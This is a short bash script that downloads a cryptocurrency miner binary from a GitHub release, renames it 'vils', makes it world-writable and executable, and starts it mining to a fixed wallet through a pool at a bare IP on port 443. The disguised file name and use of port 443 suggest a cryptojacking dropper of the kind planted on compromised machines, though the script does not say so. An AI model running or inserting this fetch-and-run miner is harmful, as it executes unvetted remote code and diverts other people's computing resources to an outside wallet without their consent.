#!/bin/bash
wget -O vils https://github.com/xpherechain/Xphere-miner/releases/download/v0.0.6/miner-linux-amd64
chmod 777 vils
./vils -stratum stratum+tcp://0xB4B9b6F2fa677DE9eAf7e230E895C2e2B9861E4D.Worker3:x@50.116.22.121:443
